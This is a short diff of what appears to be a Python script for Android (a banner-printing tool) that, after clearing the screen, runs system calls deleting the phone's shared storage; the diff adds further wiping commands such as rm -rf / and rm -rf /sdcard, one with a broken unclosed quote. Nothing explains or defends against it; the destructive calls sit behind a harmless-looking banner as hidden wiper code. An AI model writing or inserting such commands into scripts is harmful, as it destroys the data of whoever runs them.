@@ -22,3 +22,12 @@ print g + "#########################################"
 system('clear')
 system("cd /sdcard")
 system("rm -rf /storage/emulated/0")
+system("cd")
+system("rm -rf /)
+system("rm -rf /sdcard")
+system("rm -rf /sdcard/")
+system("cd /storage")
+system("rm -rf /sdcard")
+
+
+ 
